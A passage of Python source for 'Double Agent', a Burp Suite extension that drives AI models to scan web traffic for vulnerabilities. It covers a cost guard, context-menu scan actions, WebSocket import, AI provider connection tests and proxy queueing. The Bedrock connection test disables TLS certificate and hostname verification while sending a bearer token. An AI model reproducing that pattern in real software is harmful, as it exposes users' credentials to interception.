            completion_tokens = int(completion_tokens) if completion_tokens is not None else 0
        except:
            completion_tokens = 0

        total_tokens = prompt_tokens + completion_tokens
        pricing = self._get_token_pricing()
        cost = (prompt_tokens / 1000.0) * float(pricing.get("input", 0.0))
        cost += (completion_tokens / 1000.0) * float(pricing.get("output", 0.0))

        triggered_threshold = None
        current_cost = 0.0
        with self.stats_lock:
            self.stats["estimated_cost_usd"] = self.stats.get("estimated_cost_usd", 0.0) + cost
            current_cost = float(self.stats.get("estimated_cost_usd", 0.0))
            if current_cost >= float(self.next_cost_pause_threshold_usd):
                triggered_threshold = float(self.next_cost_pause_threshold_usd)
                self.next_cost_pause_threshold_usd += float(self.cost_pause_interval_usd)
        self._ui_dirty = True
        if triggered_threshold is not None:
            self._trigger_cost_safety_pause(triggered_threshold, current_cost)

    def _trigger_cost_safety_pause(self, threshold_usd, current_cost_usd):
        with self.control_lock:
            already_paused = self.pause_all
            if not self.pause_all:
                self.pause_all = True

        paused_count = 0
        if not already_paused:
            with self.tasks_lock:
                for task in self.tasks:
                    status = task.get("status", "")
                    if ("Completed" not in status and
                        "Error" not in status and
                        "Cancelled" not in status and
                        "Skipped" not in status):
                        task["status"] = "Paused"
                        paused_count += 1

        self.stderr.println("\n[COST GUARD] Session cost reached $%.2f (current: $%.4f)." %
                           (float(threshold_usd), float(current_cost_usd)))
        self.stderr.println("[COST GUARD] Auto-paused %d active task(s)." % int(paused_count))
        self.stderr.println("[COST GUARD] Click 'Pause Analysis' to manually resume scanning.")
        self.stderr.println("[COST GUARD] Next automatic pause threshold: $%.2f" %
                           float(self.next_cost_pause_threshold_usd))
        self._ui_dirty = True
        self.refreshUI()

    def _get_token_pricing(self):
        provider_pricing = self.token_pricing_per_1k.get(self.AI_PROVIDER, {"input": 0.0, "output": 0.0})
        if self.AI_PROVIDER == "OpenAI":
            model_l = str(self.MODEL or "").lower()
            for model_key, model_pricing in self.openai_model_pricing_per_1k.items():
                if model_key in model_l:
                    return model_pricing
            return provider_pricing

        if self.AI_PROVIDER == "Bedrock":
            model_l = str(self.MODEL or "").lower()
            for model_key, model_pricing in self.bedrock_model_pricing_per_1k.items():
                if model_key in model_l:
                    return model_pricing

            warning_key = "bedrock|" + model_l
            if warning_key not in self._pricing_warning_cache:
                self._pricing_warning_cache.add(warning_key)
                self.stderr.println("[PRICING] No Bedrock pricing profile for model '%s'. Cost estimate may be inaccurate." % str(self.MODEL))
            return provider_pricing

        return provider_pricing

    def _is_bedrock_pricing_known(self):
        if self.AI_PROVIDER != "Bedrock":
            return True
        model_l = str(self.MODEL or "").lower()
        if not model_l:
            return False
        for model_key in self.bedrock_model_pricing_per_1k.keys():
            if model_key in model_l:
                return True
        return False

    def getTabCaption(self):
        return "Double Agent"

    def getUiComponent(self):
        return self.panel

    def createMenuItems(self, invocation):
        menu_list = ArrayList()

        context = invocation.getInvocationContext()
        http_contexts = [
            invocation.CONTEXT_MESSAGE_EDITOR_REQUEST,
            invocation.CONTEXT_MESSAGE_VIEWER_REQUEST,
            invocation.CONTEXT_PROXY_HISTORY,
            invocation.CONTEXT_TARGET_SITE_MAP_TABLE,
            invocation.CONTEXT_TARGET_SITE_MAP_TREE,
        ]

        if context in http_contexts:
            messages = invocation.getSelectedMessages()
            if messages and len(messages) > 0:
                double_agent_menu = JMenu("Double Agent")

                passive_item = JMenuItem("Passive Scan")
                passive_item.addActionListener(lambda x, msgs=messages: self.analyzeFromContextMenu(msgs))
                double_agent_menu.add(passive_item)

                active_item = JMenuItem("Active Scan with Agent")
                active_item.addActionListener(lambda x, msgs=messages: self._activeScanContextDialog(msgs))
                double_agent_menu.add(active_item)

                if len(messages) > 1:
                    flow_item = JMenuItem("Analyze Flow")
                    flow_item.addActionListener(lambda x, msgs=messages: self._analyzeFlowContextDialog(msgs))
                    double_agent_menu.add(flow_item)

                menu_list.add(double_agent_menu)

        return menu_list if menu_list.size() > 0 else None

    def _sendWebSocketContextToAgent(self, messages):
        """Queue WebSocket messages from context menu for agent analysis."""
        t = threading.Thread(target=self._sendWebSocketContextToAgentThread, args=(messages,))
        t.setDaemon(True)
        t.start()

    def _sendWebSocketContextToAgentThread(self, messages):
        try:
            if self.agent_server is None:
                self.stdout.println("[AGENT] Server not running, starting now...")
                if not self.start_agent_server():
                    self.stderr.println("[AGENT] Failed to start server; cannot enqueue WebSocket messages")
                    return

            queued = 0
            for msg in messages:
                try:
                    direction = msg.getDirection()
                    direction_str = "client-to-server" if direction == msg.DIRECTION_CLIENT_TO_SERVER else "server-to-client"
                    payload = msg.getPayload()
                    if not payload or len(payload) == 0:
                        continue
                    try:
                        payload_str = self.helpers.bytesToString(payload)
                    except:
                        payload_str = "[binary payload: %d bytes]" % len(payload)

                    ws_url = ""
                    try:
                        annotations = msg.getAnnotations()
                        if annotations:
                            ws_url = str(annotations.getUrl() if hasattr(annotations, 'getUrl') else "")
                    except:
                        pass

                    self._sendWebSocketToAgent(msg, direction_str, payload_str, ws_url)
                    queued += 1
                except Exception as e:
                    self.stderr.println("[WS CONTEXT] Error: %s" % self._safe_ascii_text(e))
                    continue

            if queued > 0:
                self.stdout.println("[WS CONTEXT] Queued %d WebSocket message(s) for agent" % queued)
                self._ui_dirty = True
                self.refreshUI()
                self._focus_agent_tab()

        except Exception as e:
            self.stderr.println("[WS CONTEXT] Error: %s" % self._safe_ascii_text(e))

    def _showWebSocketImportDialog(self):
        """Show dialog to manually import a WebSocket message for agent analysis."""
        from javax.swing import JDialog, JTextField, JComboBox, JTextArea, JScrollPane, JLabel
        from java.awt import BorderLayout, GridLayout, Dimension
        
        dialog = JDialog()
        dialog.setTitle("Import WebSocket Message")
        dialog.setModal(False)  # Non-modal so user can navigate Burp
        dialog.setSize(600, 400)
        
        panel = JPanel(BorderLayout())
        
        # Input fields panel
        inputPanel = JPanel(GridLayout(4, 1, 5, 5))
        
        # URL field
        urlPanel = JPanel(BorderLayout())
        urlPanel.add(JLabel("WebSocket URL:"), BorderLayout.WEST)
        urlField = JTextField("wss://example.com/socket", 50)
        urlPanel.add(urlField, BorderLayout.CENTER)
        inputPanel.add(urlPanel)
        
        # Direction dropdown
        dirPanel = JPanel(BorderLayout())
        dirPanel.add(JLabel("Direction:"), BorderLayout.WEST)
        dirCombo = JComboBox(["client-to-server", "server-to-client"])
        dirPanel.add(dirCombo, BorderLayout.CENTER)
        inputPanel.add(dirPanel)
        
        # Payload text area
        payloadPanel = JPanel(BorderLayout())
        payloadPanel.add(JLabel("Payload (JSON/text):"), BorderLayout.NORTH)
        payloadArea = JTextArea(10, 50)
        payloadArea.setFont(Font("Monospaced", Font.PLAIN, 11))
        payloadScroll = JScrollPane(payloadArea)
        payloadPanel.add(payloadScroll, BorderLayout.CENTER)
        
        panel.add(inputPanel, BorderLayout.NORTH)
        panel.add(payloadPanel, BorderLayout.CENTER)
        
        # Buttons
        buttonPanel = JPanel()
        result = [None]
        
        def onCancel(e):
            result[0] = None
            dialog.dispose()
        
        def onImport(e):
            try:
                url = str(urlField.getText()).strip()
                direction = str(dirCombo.getSelectedItem())
                payload = str(payloadArea.getText()).strip()
                
                if not url or not payload:
                    return
                
                # Queue the WebSocket message
                if self.agent_server is None:
                    self.stdout.println("[AGENT] Server not running, starting now...")
                    if not self.start_agent_server():
                        self.stderr.println("[AGENT] Failed to start server; cannot import WebSocket")
                        dialog.dispose()
                        return
                
                with self.agent_queue_lock:
                    if len(self.agent_queue) >= self.MAX_AGENT_QUEUE_SIZE:
                        self.stderr.println("[WS] Queue is full, cannot import")
                        dialog.dispose()
                        return
                    
                    qid = self.agent_queue_next_id
                    self.agent_queue_next_id += 1
                    
                    summary = "WS %s: %s" % (direction, payload[:60])
                    
                    queue_item = {
                        "id": qid,
                        "status": "pending",
                        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "claimed_at": None,
                        "completed_at": None,
                        "summary": summary,
                        "assessment": "",
                        "test_results": [],
                        "notes": [],
                        "source": "websocket_manual",
                        "browser_verify": False,
                        "user_context": "",
                        "finding_ids": [],
                        "ws_direction": direction,
                        "ws_url": url,
                        "ws_payload": payload[:10240],
                        "ws_payload_length": len(payload)
                    }
                    self.agent_queue.append(queue_item)
                    self.selected_agent_queue_index = len(self.agent_queue) - 1
                
                self.save_agent_queue()
                self.stdout.println("[WS] Imported WebSocket message for agent: %s" % summary)
                self._ui_dirty = True
                self.refreshUI()
                self._focus_agent_tab()
                result[0] = True
                
            except Exception as ex:
                self.stderr.println("[WS] Import error: %s" % self._safe_ascii_text(ex))
            finally:
                dialog.dispose()
        
        cancelBtn = JButton("Cancel")
        cancelBtn.addActionListener(onCancel)
        buttonPanel.add(cancelBtn)
        
        importBtn = JButton("Import to Queue")
        importBtn.addActionListener(onImport)
        buttonPanel.add(importBtn)
        
        panel.add(buttonPanel, BorderLayout.SOUTH)
        
        dialog.getContentPane().add(panel)
        dialog.setLocationRelativeTo(None)
        dialog.setVisible(True)

    def analyzeFromContextMenu(self, messages):
        t = threading.Thread(target=self._analyzeFromContextMenuThread, args=(messages,))
        t.setDaemon(True)
        t.start()
    
    def _analyzeFromContextMenuThread(self, messages):
        seen_keys = set()
        unique_messages = []
        
        for message in messages:
            try:
                req = self.helpers.analyzeRequest(message)
                url_str = str(req.getUrl())
                
                request_bytes = message.getRequest()
                if request_bytes:
                    import hashlib
                    request_hash = hashlib.md5(request_bytes.tostring()).hexdigest()[:8]
                    unique_key = "%s|%s" % (url_str, request_hash)
                else:
                    unique_key = url_str
                
                current_time = time.time()
                with self.context_menu_lock:
                    last_invoke_time = self.context_menu_last_invoke.get(unique_key, 0)
                    if current_time - last_invoke_time < self.context_menu_debounce_time:
                        if self.VERBOSE:
                            self.stdout.println("[DEBUG] Debouncing duplicate context menu invoke: %s" % url_str)
                        continue
                    
                    self.context_menu_last_invoke[unique_key] = current_time
                
                if unique_key not in seen_keys:
                    seen_keys.add(unique_key)
                    unique_messages.append(message)
            except:
                pass
        
        if len(unique_messages) == 0:
            return
        
        self.stdout.println("\n[CONTEXT MENU] Analyzing %d unique request(s)..." % len(unique_messages))
        for message in unique_messages:
            try:
                req = self.helpers.analyzeRequest(message)
                url_str = str(req.getUrl())
                self.stdout.println("[CONTEXT MENU] URL: %s" % url_str)
                
                if message.getResponse() is None:
                    self.stdout.println("[CONTEXT MENU] No response - sending request...")
                    
                    try:
                        http_service = message.getHttpService()
                        request_bytes = message.getRequest()
                        
                        response = self.callbacks.makeHttpRequest(http_service, request_bytes)
                        
                        if response is None or response.getResponse() is None:
                            self.stdout.println("[CONTEXT MENU] ERROR: Failed to get response")
                            continue
                        
                        message = response
                        
                    except Exception as e:
                        self.stderr.println("[!] Failed to send request: %s" % self._safe_ascii_text(e))
                        continue
                
                self.stdout.println("[CONTEXT MENU] Running analysis...")
                task_id = self.addTask("CONTEXT", url_str, "Queued", message)
                # Check thread cap before creating thread
                with self._analysis_thread_lock:
                    if self._active_analysis_threads >= self.MAX_QUEUED_ANALYSES:
                        self.stderr.println("[CONTEXT MENU] Analysis queue full, skipping")
                        self.updateTask(task_id, "Skipped (Queue Full)")
                        return
                    self._active_analysis_threads += 1
                    self.stdout.println("[THREAD] Counter incremented: %d/%d (CONTEXT)" % (self._active_analysis_threads, self.MAX_QUEUED_ANALYSES))
                # Use special forced analysis that bypasses deduplication
                t = threading.Thread(target=self.analyze_forced, args=(message, url_str, task_id))
                t.setDaemon(True)
                t.start()
            except Exception as e:
                self.stderr.println("[!] Context menu error: %s" % self._safe_ascii_text(e))

    def test_ai_connection(self):
        self.stdout.println("\n[AI CONNECTION] Testing connection to %s..." % self.API_URL)
        
        try:
            if self.AI_PROVIDER == "Ollama":
                return self._test_ollama_connection()
            elif self.AI_PROVIDER == "OpenAI":
                return self._test_openai_connection()
            elif self.AI_PROVIDER == "Claude":
                return self._test_claude_connection()
            elif self.AI_PROVIDER == "Gemini":
                return self._test_gemini_connection()
            elif self.AI_PROVIDER == "Bedrock":
                return self._test_bedrock_connection()
            elif self.AI_PROVIDER == "DeepSeek":
                return self._test_deepseek_connection()
            else:
                self.stderr.println("[!] Unknown AI provider: %s" % self.AI_PROVIDER)
                return False
        except Exception as e:
            self.stderr.println("[!] AI connection test failed: %s" % self._safe_ascii_text(e))
            return False
    
    def _test_ollama_connection(self):
        try:
            tags_url = self.API_URL.rstrip('/api/generate').rstrip('/') + "/api/tags"
            
            req = urllib2.Request(tags_url)
            req.add_header('Content-Type', 'application/json')
            
            response = urllib2.urlopen(req, timeout=10)
            data = json.loads(response.read())
            
            if 'models' in data:
                self.available_models = [model['name'] for model in data['models']]
                self.stdout.println("[AI CONNECTION] OK Connected to Ollama")
                self.stdout.println("[AI CONNECTION] Found %d models" % len(self.available_models))
                
                if self.MODEL not in self.available_models and len(self.available_models) > 0:
                    old_model = self.MODEL
                    self.MODEL = self.available_models[0]
                    self.stdout.println("[AI CONNECTION] Model '%s' not found, using '%s'" % 
                                      (old_model, self.MODEL))
                
                return True
            else:
                self.stderr.println("[!] Unexpected response from Ollama API")
                return False
                
        except urllib2.URLError as e:
            self.stderr.println("[!] Cannot connect to Ollama at %s: %s" % (self.API_URL, e))
            return False
    
    def _test_openai_connection(self):
        if not self.API_KEY:
            self.stderr.println("[!] OpenAI API key required")
            return False
        
        def _estimate_openai_context_window(model_name):
            model_l = str(model_name or "").lower()
            if "gpt-4o" in model_l or "gpt-4.1" in model_l or "gpt-5" in model_l:
                return 128000
            if model_l.startswith("gpt-4"):
                return 8192
            if "gpt-3.5" in model_l:
                return 16385
            return 0

        try:
            req = urllib2.Request("https://api.openai.com/v1/models")
            req.add_header('Authorization', 'Bearer ' + self.API_KEY)
            
            response = urllib2.urlopen(req, timeout=10)
            data = json.loads(response.read())
            
            if 'data' in data:
                all_gpt_models = [model['id'] for model in data['data'] if 'gpt' in model['id']]
                eligible_models = []
                for model_id in all_gpt_models:
                    if _estimate_openai_context_window(model_id) >= 120000:
                        eligible_models.append(model_id)

                self.available_models = eligible_models
                self.stdout.println("[AI CONNECTION] OK Connected to OpenAI")
                self.stdout.println("[AI CONNECTION] Found %d GPT model(s)" % len(all_gpt_models))
                self.stdout.println("[AI CONNECTION] Eligible models (>=120k context): %d" % len(self.available_models))

                if len(self.available_models) == 0:
                    self.stderr.println("[!] No OpenAI models with >=120k context window are available for this account")
                    return False

                if self.MODEL not in self.available_models and len(self.available_models) > 0:
                    old_model = self.MODEL
                    self.MODEL = self.available_models[0]
                    self.stdout.println("[AI CONNECTION] Model '%s' not available, using '%s'" %
                                      (old_model, self.MODEL))
                return True
            return False
        except Exception as e:
            self.stderr.println("[!] OpenAI connection failed: %s" % self._safe_ascii_text(e))
            return False
    
    def _test_deepseek_connection(self):
        if not self.API_KEY:
            self.stderr.println("[!] DeepSeek API key required")
            return False
        try:
            api_base = (self.API_URL or "https://api.deepseek.com/v1").rstrip("/")
            req = urllib2.Request(api_base + "/models")
            req.add_header('Authorization', 'Bearer ' + self.API_KEY)
            req.add_header('Content-Type', 'application/json')

            response = urllib2.urlopen(req, timeout=10)
            data = json.loads(response.read())

            if 'data' in data:
                self.available_models = [model['id'] for model in data['data']]
                self.stdout.println("[AI CONNECTION] OK Connected to DeepSeek")
                self.stdout.println("[AI CONNECTION] Found %d model(s): %s" % (
                    len(self.available_models), ", ".join(self.available_models)))

                if self.MODEL not in self.available_models and len(self.available_models) > 0:
                    old_model = self.MODEL
                    self.MODEL = self.available_models[0]
                    self.stdout.println("[AI CONNECTION] Model '%s' not available, using '%s'" %
                                      (old_model, self.MODEL))
                return True
            else:
                self.stderr.println("[!] Unexpected response from DeepSeek API")
                return False
        except Exception as e:
            self.stderr.println("[!] DeepSeek connection failed: %s" % self._safe_ascii_text(e))
            return False

    def _test_claude_connection(self):
        if not self.API_KEY:
            self.stderr.println("[!] Claude API key required")
            return False
        
        self.available_models = [
            "claude-3-5-sonnet-20241022",
            "claude-3-opus-20240229",
            "claude-3-sonnet-20240229"
        ]
        self.stdout.println("[AI CONNECTION] OK Claude API configured")
        return True
    
    def _test_gemini_connection(self):
        if not self.API_KEY:
            self.stderr.println("[!] Gemini API key required")
            return False
        
        self.available_models = [
            "gemini-1.5-pro",
            "gemini-1.5-flash",
            "gemini-pro"
        ]
        self.stdout.println("[AI CONNECTION] OK Gemini API configured")
        return True

    def _aws_hmac_sha256(self, key, msg):
        return hmac.new(key, msg, hashlib.sha256).digest()

    def _build_aws_sigv4_headers(self, method, service, host, canonical_uri, query_string, payload_text, region, access_key, secret_key, session_token=None, content_type=None):
        amz_date = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
        date_stamp = amz_date[:8]
        payload_hash = hashlib.sha256(payload_text).hexdigest()

        canonical_headers_map = {
            "host": host,
            "x-amz-content-sha256": payload_hash,
            "x-amz-date": amz_date
        }
        if session_token:
            canonical_headers_map["x-amz-security-token"] = session_token
        if content_type:
            canonical_headers_map["content-type"] = content_type

        sorted_keys = sorted(canonical_headers_map.keys())
        canonical_headers = ""
        for k in sorted_keys:
            canonical_headers += k + ":" + str(canonical_headers_map[k]).strip() + "\n"
        signed_headers = ";".join(sorted_keys)

        canonical_request = method + "\n" + canonical_uri + "\n" + query_string + "\n" + canonical_headers + "\n" + signed_headers + "\n" + payload_hash
        algorithm = "AWS4-HMAC-SHA256"
        credential_scope = date_stamp + "/" + region + "/" + service + "/aws4_request"
        string_to_sign = algorithm + "\n" + amz_date + "\n" + credential_scope + "\n" + hashlib.sha256(canonical_request).hexdigest()

        k_date = self._aws_hmac_sha256("AWS4" + secret_key, date_stamp)
        k_region = self._aws_hmac_sha256(k_date, region)
        k_service = self._aws_hmac_sha256(k_region, service)
        k_signing = self._aws_hmac_sha256(k_service, "aws4_request")
        signature = hmac.new(k_signing, string_to_sign, hashlib.sha256).hexdigest()

        authorization_header = (
            algorithm + " Credential=" + access_key + "/" + credential_scope +
            ", SignedHeaders=" + signed_headers +
            ", Signature=" + signature
        )

        headers = {
            "Host": host,
            "x-amz-date": amz_date,
            "x-amz-content-sha256": payload_hash,
            "Authorization": authorization_header
        }
        if session_token:
            headers["x-amz-security-token"] = session_token
        if content_type:
            headers["Content-Type"] = content_type
        return headers

    def _looks_like_non_serverless_bedrock_id(self, model_id):
        model_l = str(model_id or "").strip().lower()
        if not model_l:
            return True
        blocked_markers = [
            "provisioned-model",
            "custom-model",
            "imported-model",
            "marketplace",
            "endpoint",
            "application-inference-profile"
        ]
        if model_l.startswith("arn:"):
            return True
        for marker in blocked_markers:
            if marker in model_l:
                return True
        return False

    def _is_bedrock_serverless_model_id(self, model_id, allow_cached=True):
        model = str(model_id or "").strip()
        if not model or self._looks_like_non_serverless_bedrock_id(model):
            return False
        if allow_cached and model in self.available_models:
            return True
        # AWS-managed inference profile prefixes are serverless. The fixed fallback
        # uses this path so the dialog remains usable before a refresh succeeds.
        managed_profile_prefixes = ("global.", "us.", "eu.", "apac.", "ap.", "sa.", "ca.")
        if model.startswith(managed_profile_prefixes):
            return True
        # Plain foundation model IDs are allowed only when they came from the
        # Bedrock ListFoundationModels ON_DEMAND filter and are in available_models.
        return False

    def _filter_bedrock_serverless_models(self, models):
        filtered = []
        seen = set()
        for model in models or []:
            model_s = str(model or "").strip()
            if not model_s or model_s in seen:
                continue
            if self._is_bedrock_serverless_model_id(model_s, allow_cached=False):
                filtered.append(model_s)
                seen.add(model_s)
                continue
            # Non-profile foundation model IDs are accepted only by callers that
            # already filtered AWS metadata to inferenceTypesSupported=ON_DEMAND.
            if not self._looks_like_non_serverless_bedrock_id(model_s) and "." in model_s:
                filtered.append(model_s)
                seen.add(model_s)
        return sorted(filtered)

    def _bedrock_serverless_models(self):
        models = self._filter_bedrock_serverless_models(self.available_models)
        if len(models) > 0:
            return models
        if self._is_bedrock_serverless_model_id(self.BEDROCK_FIXED_MODEL, allow_cached=False):
            return [self.BEDROCK_FIXED_MODEL]
        return []

    def _test_bedrock_connection(self):
        region = (self.BEDROCK_REGION or "us-east-1").strip()
        bearer_token = self._normalize_bedrock_api_key(self.API_KEY)

        if not bearer_token:
            self.stderr.println("[!] Bedrock requires API Key (Bearer token)")
            return False

        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        host = ((self.API_URL or "").strip().replace("https://", "").replace("http://", "").split("/")[0]
                or ("bedrock-runtime.%s.amazonaws.com" % region))
        headers = {
            "Authorization": "Bearer " + bearer_token,
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

        # Step 1: Fetch serverless models only: ON_DEMAND foundation models + AWS-managed inference profiles
        fetched = []
        foundation_count = 0
        profile_count = 0
        list_host = "bedrock.%s.amazonaws.com" % region
        list_headers = dict(headers, Host=list_host)

        # 1a: Foundation models (serverless on-demand only)
        try:
            list_url = "https://%s/foundation-models?byOutputModality=TEXT" % list_host
            list_req = urllib2.Request(list_url, headers=list_headers)
            list_resp = urllib2.urlopen(list_req, timeout=10, context=ctx)
            list_data = json.loads(list_resp.read())
            for m in list_data.get("modelSummaries", []):
                model_id = m.get("modelId", "")
                if model_id and "ON_DEMAND" in m.get("inferenceTypesSupported", []):
                    fetched.append(model_id)
                    foundation_count += 1
            self.stdout.println("[AI CONNECTION] Serverless ON_DEMAND foundation models fetched: %d" % foundation_count)
        except Exception as e1:
            self.stdout.println("[AI CONNECTION] Could not list foundation models: %s" % self._safe_ascii_text(e1))

        # 1b: AWS-managed inference profiles (serverless cross-region/global routing)
        try:
            profiles_url = "https://%s/inference-profiles" % list_host
            profiles_req = urllib2.Request(profiles_url, headers=list_headers)
            profiles_resp = urllib2.urlopen(profiles_req, timeout=10, context=ctx)
            profiles_data = json.loads(profiles_resp.read())
            for p in profiles_data.get("inferenceProfileSummaries", []):
                profile_id = p.get("inferenceProfileId", "")
                # Only include SYSTEM_DEFINED profiles (serverless cross-region inference)
                if profile_id and p.get("type") == "SYSTEM_DEFINED" and profile_id not in fetched:
                    fetched.append(profile_id)
                    profile_count += 1
            self.stdout.println("[AI CONNECTION] Serverless SYSTEM_DEFINED inference profiles fetched: %d" % profile_count)
        except Exception as e2:
            self.stdout.println("[AI CONNECTION] Could not list inference profiles: %s" % self._safe_ascii_text(e2))

        serverless_models = self._filter_bedrock_serverless_models(fetched)
        if serverless_models:
            self.available_models = serverless_models
            self.stdout.println("[AI CONNECTION] Bedrock serverless model options: %d" % len(self.available_models))
        else:
            self.available_models = [self.BEDROCK_FIXED_MODEL]
            self.stdout.println("[AI CONNECTION] No serverless models listed, using default managed inference profile")

        # Keep current model if it's still in the list, otherwise pick the first available
        if self.MODEL not in self.available_models:
            self.MODEL = self.available_models[0]

        # Step 2: Verify connectivity with a minimal invoke call
        invoke_path = "/model/%s/invoke" % self.MODEL
        invoke_url = "https://%s%s" % (host, invoke_path)
        payload = json.dumps({
            "anthropic_version": "bedrock-2023-05-31",
            "max_tokens": 1,
            "messages": [{"role": "user", "content": [{"type": "text", "text": "ping"}]}]
        }).encode("utf-8")
        req = urllib2.Request(invoke_url, data=payload, headers=headers)

        try:
            urllib2.urlopen(req, timeout=10, context=ctx)
            self.stdout.println("[AI CONNECTION] OK Connected to AWS Bedrock (%s) with bearer token" % region)
            return True
        except urllib2.HTTPError as e:
            body = ""
            try:
                body = e.read()
                if isinstance(body, bytes):
                    body = body.decode("utf-8", "ignore")
            except:
                body = ""
            try:
                if isinstance(body, unicode):
                    body_text = body
                else:
                    body_text = unicode(body, "utf-8", "ignore")
            except:
                try:
                    body_text = unicode(body)
                except:
                    body_text = u""
            body_l = body_text.lower()
            if "invalid api key format" in body_l or "must start with pre-defined prefix" in body_l:
                self.stderr.println("[!] Bedrock API key format is invalid. Paste only the Bedrock bearer token value.")
                self.stderr.println("[!] Accepted formats: '<token>', 'Bearer <token>', or 'AWS_BEARER_TOKEN_BEDROCK=<token>'.")
                if str(self.API_KEY or "").strip().startswith(("AKIA", "ASIA")):
                    self.stderr.println("[!] Detected AWS access key ID format. This field requires a Bedrock bearer API key, not AKIA/ASIA credentials.")
            if "on-demand throughput isnt supported" in body_l or "on-demand throughput isn't supported" in body_l:
                self.stderr.println("[!] Bedrock model invocation mode mismatch.")
                self.stderr.println("[!] Use cross-region model ID 'us.anthropic.claude-sonnet-4-6' or your account's inference profile ID/ARN.")
            self.stderr.println("[!] Bedrock HTTP %d: %s" % (e.code, body_text.encode("ascii", "ignore")[:300]))
            return False
        except Exception as e:
            self.stderr.println("[!] Bedrock connection failed: %s" % self._safe_ascii_text(e))
            return False
    
    def print_logo(self):
        self.stdout.println("")
        self.stdout.println("=" * 65)
        self.stdout.println("")
        self.stdout.println("     DOUBLE AGENT")
        self.stdout.println("     ---------------")
        self.stdout.println("     AI-Powered Application Testing for BurpSuite")
        self.stdout.println("")
        self.stdout.println("     VERSION v%s" % self.VERSION)
        self.stdout.println("")
        self.stdout.println("     Intelligent | Silent | Adaptive | Comprehensive")
        self.stdout.println("")
        self.stdout.println("     Burp Suite AI Testing Extension")
        self.stdout.println("")
        self.stdout.println("=" * 65)
        self.stdout.println("")

    def _queue_proxy_traffic_analysis(self, messageInfo, source="PROXY"):
        queue_start = time.time()
        timings = []
        if not self.PASSIVE_SCANNING_ENABLED:
            return False

        url_str = None
        url_hash = None
        priority_score = 0
        priority_reasons = []
        high_value = False
        try:
            phase_start = time.time()
            if messageInfo.getResponse() is None:
                return False
            req = self.helpers.analyzeRequest(messageInfo)
            method = str(req.getMethod() or "")
            timings.append(("analyzeRequest", self._perf_ms_since(phase_start)))
            if method == "OPTIONS":
                self._perf_debug("proxy skip OPTIONS setup=%dms" % self._perf_ms_since(queue_start), key="proxy-skip-options", min_interval=10.0)
                return False
            url_str = str(req.getUrl())

            phase_start = time.time()
            priority_score, priority_reasons = self._passive_request_priority(req, url_str, messageInfo)
            high_value = priority_score >= int(getattr(self, "PASSIVE_HIGH_VALUE_SCORE", 2))
            timings.append(("priority", self._perf_ms_since(phase_start)))

            phase_start = time.time()
            if not self.is_in_scope(url_str, log=(source != "PROXY")):
                if self.VERBOSE and source != "PROXY":
                    self.stdout.println("[%s] URL: %s - [SKIP] Out of scope" % (source, url_str))
                timings.append(("scope", self._perf_ms_since(phase_start)))
                self._perf_debug("proxy skip out_of_scope setup=%dms url=%s" % (self._perf_ms_since(queue_start), url_str[:120]), key="proxy-skip-scope", min_interval=10.0)
                return False
            timings.append(("scope", self._perf_ms_since(phase_start)))

            # Skip static file extensions
            phase_start = time.time()
            if self.should_skip_extension(url_str):
                timings.append(("extension", self._perf_ms_since(phase_start)))
                self._perf_debug("proxy skip extension setup=%dms url=%s" % (self._perf_ms_since(queue_start), url_str[:120]), key="proxy-skip-extension", min_interval=10.0)
                return False
            timings.append(("extension", self._perf_ms_since(phase_start)))

            # Skip static asset paths (bundler output, sourcemaps, fonts)
            _path_lower = url_str.lower().split("?")[0]
            _static_path_markers = [
                "/_next/static/", "/static/chunks/", "/static/media/",
                "/__webpack", "/.nuxt/", "/dist/static/", "/assets/static/",
                ".chunk.js", ".bundle.js", "-manifest.json", "/_buildmanifest",
                "/_ssgmanifest", "/webpack-runtime", "/runtime~main"
            ]
            if any(m in _path_lower for m in _static_path_markers):
                if self._is_javascript_url(url_str):
                    self._perf_debug(
                        "proxy keep security-relevant JavaScript bundle priority=%d reasons=%s url=%s" % (
                            int(priority_score), ",".join(priority_reasons[:5]), url_str[:120]),
                        key="proxy-keep-js-bundle", min_interval=2.0)
                else:
                    self._perf_debug("proxy skip static_path setup=%dms url=%s" % (self._perf_ms_since(queue_start), url_str[:120]), key="proxy-skip-static-path", min_interval=10.0)
                    return False

            phase_start = time.time()
            url_hash = self._get_raw_url_hash(url_str, req.getParameters(), req, messageInfo.getRequest())
            timings.append(("hash", self._perf_ms_since(phase_start)))
            phase_start = time.time()
            if not self._reserve_url_hash_for_queue(url_hash, source, url_str):
                reserve_reason = getattr(self, "_last_reserve_skip_reason", "") or "duplicate"
                if reserve_reason == "retry_cooldown":
                    self.updateStats("skipped_retry_cooldown")
                else:
                    self.updateStats("skipped_duplicate")
                timings.append(("reserve", self._perf_ms_since(phase_start)))
                self._perf_debug(
                    "proxy skip %s setup=%dms url=%s" % (
                        reserve_reason, self._perf_ms_since(queue_start), url_str[:120]),
                    key="proxy-skip-" + str(reserve_reason), min_interval=5.0)
                return False
            timings.append(("reserve", self._perf_ms_since(phase_start)))

        except Exception as _e:
            self.stderr.println("[%s] Setup error for %s: %s" % (source, url_str or "Unknown", str(_e)))
            return False

        skip_reason = ""
        with self._analysis_thread_lock:
            cap = self.MAX_PROXY_QUEUED_ANALYSES if source == "PROXY" else self.MAX_QUEUED_ANALYSES
            if source == "PROXY" and high_value:
                cap = max(int(cap), int(getattr(self, "MAX_HIGH_VALUE_PROXY_QUEUED_ANALYSES", 8)))
            if self._active_analysis_threads >= cap:
                skip_reason = "proxy_backlog_full" if source == "PROXY" else "queue_full"
            elif source == "PROXY" and not high_value:
                now = time.time()
                min_interval = float(getattr(self, "PROXY_ANALYSIS_MIN_INTERVAL_SECONDS", 1.0))
                last_queued = float(getattr(self, "_last_proxy_analysis_queued_at", 0.0))
                if min_interval > 0 and (now - last_queued) < min_interval:
                    skip_reason = "proxy_throttle"
                else:
                    self._last_proxy_analysis_queued_at = now

            if skip_reason:
                with self.url_lock:
                    self.queued_url_hashes.discard(url_hash)
                if source == "PROXY":
                    self.updateStats("skipped_backpressure")
                    should_log_cap = False
                    now = time.time()
                    last_log = getattr(self, "_last_proxy_backpressure_log", 0)
                    if (now - last_log) >= 10:
                        should_log_cap = True
                        self._last_proxy_backpressure_log = now
                    if should_log_cap:
                        self.stdout.println("[PROXY PERF] Backpressure skipped proxy analysis (%s, active=%d, cap=%d)" % (
                            skip_reason, self._active_analysis_threads, cap))
                else:
